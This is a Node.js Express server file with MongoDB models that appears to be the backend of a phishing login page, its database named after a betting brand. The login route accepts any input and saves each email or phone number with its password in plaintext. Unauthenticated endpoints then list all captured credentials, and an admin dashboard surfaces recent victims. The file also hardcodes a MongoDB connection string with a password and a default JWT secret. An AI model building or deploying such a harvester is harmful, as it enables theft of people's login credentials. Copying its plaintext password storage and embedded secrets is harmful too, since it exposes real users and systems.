const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';

// Middleware
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// Define User Schema inline - keep your original schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

// Define Admin Schema separately
const adminSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: { type: Date, default: Date.now }
});

// MongoDB Connection - keeping your original connection
mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/New4raBet', {
}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
});

// Define models after connection is established
const User = mongoose.model('User', userSchema);
const Admin = mongoose.model('Admin', adminSchema);

// Preserve your original routes
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;
    
    // Create a new user entry for each login
    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate,
      loginTime,
      loginHistory: [
        {
          date: loginDate,
          time: loginTime,
          method: loginMethod,
          device: 'Web Browser'
        }
      ]
    });
    
    await user.save();
    
    // Send user data back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password, // Make sure password is included
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };
    
    res.status(200).json(userData);
    
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get user details route (most recent user)
app.get('/api/user', async (req, res) => {
  try {
    // Get the most recent user
    const user = await User.findOne().sort({ createdAt: -1 });
    
    if (!user) {
      return res.status(404).json({ message: 'No users found' });
    }
    
    // Send user data back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password, // Make sure password is included
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };
    
    res.status(200).json(userData);
    
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all users route
app.get('/api/users', async (req, res) => {
  try {
    // Get all users, sorted by creation date (newest first)
    const users = await User.find().sort({ createdAt: -1 });
    
    if (!users || users.length === 0) {
      return res.status(404).json({ message: 'No users found' });
    }
    
    // Send all users data back to client
    const usersData = users.map(user => ({
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password, // Make sure password is included
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    }));
    
    res.status(200).json(usersData);
    
  } catch (error) {
    console.error('Get all users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// NEW ADMIN ROUTES
// Admin Registration
app.post('/api/admin/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;
    
    // Check if admin already exists
    const existingAdmin = await Admin.findOne({ email });
    if (existingAdmin) {
      return res.status(400).json({ message: 'Admin with this email already exists' });
    }
    
    // Hash password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, 10);
    
    // Create new admin
    const admin = new Admin({
      name,
      email,
      password: hashedPassword
    });
    
    await admin.save();
    
    // Generate JWT token
    const token = jwt.sign(
      { id: admin._id, email: admin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    res.status(201).json({
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email
      }
    });
    
  } catch (error) {
    console.error('Admin registration error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Admin Login - NEW API ENDPOINT
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Find admin by email
    const admin = await Admin.findOne({ email });
    if (!admin) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    // Validate password
    const validPassword = await bcrypt.compare(password, admin.password);
    if (!validPassword) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    // Update last login
    admin.lastLogin = new Date();
    await admin.save();
    
    // Generate JWT token
    const token = jwt.sign(
      { id: admin._id, email: admin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    res.status(200).json({
      success: true,
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email
      }
    });
    
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Middleware to verify admin token
const verifyAdminToken = (req, res, next) => {
  const token = req.header('x-auth-token');
  
  if (!token) {
    return res.status(401).json({ message: 'Access denied: No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};

// Protected admin route example
app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin.id).select('-password');
    
    if (!admin) {
      return res.status(404).json({ message: 'Admin not found' });
    }
    
    // Get user statistics
    const userCount = await User.countDocuments();
    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5);
    
    res.status(200).json({
      admin,
      stats: {
        userCount,
        recentUsers
      }
    });
    
  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Health check endpoint
app.get("/", (req, res) => {
  res.json({
    status: true
  })
})

// For Vercel serverless deployment
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}

// Export for Vercel serverless functions
module.exports = app;